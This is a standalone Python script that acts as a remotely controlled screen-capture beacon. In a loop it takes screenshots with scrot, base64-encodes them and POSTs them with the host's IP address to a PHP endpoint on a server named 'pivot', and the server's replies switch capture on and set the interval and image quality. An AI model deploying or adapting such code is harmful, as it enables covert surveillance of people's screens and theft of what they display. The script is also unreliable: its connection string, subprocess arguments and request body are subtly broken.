import subprocess
import json
import http.client as http
import base64
try:
    arch = subprocess.run(['uname', '-m'])
except FileNotFoundError:
    arch = None
server_path = "/includes/screen_requrest.php"
hostname = subprocess.check_output(['hostname', '-I'])
hostname = hostname.decode()[:-2]
server_ip = "http://pivot"
en = False
time = 5
thumb_perc = 50
quality = 50
headers = {'Content-type': 'application/json'}
while arch:
    subprocess.run(['sleep', str(time)])
    _obj = {
        'hostname': hostname,
        'file': ""
    }
    if en == True:
        subprocess.run(['scrot', '--thumb', thumb_perc, '-q', quality, '{}.jpg'.format(hostname)])
        with open('{}.jpg'.format(hostname), 'rb') as f:
            img = f.read()
            img = base64.b64encode(img).decode()
            _obj['file'] = json.dumps(img)
        subprocess.run(['rm', '{}.jpg'.format(hostname)])
    conn = http.HTTPConnection("{}:80".format(server_ip))
    conn.request("POST", server_path, _obj, headers)
    json_flags = conn.getresponse().read().decode()
    flags = json.loads(json_flags)
    if flags['en']:
        en = flags['en']
    if flags['time']:
        time = flags['time']
    if flags['quality']:
        thumb_perc = quality = flags['quality']
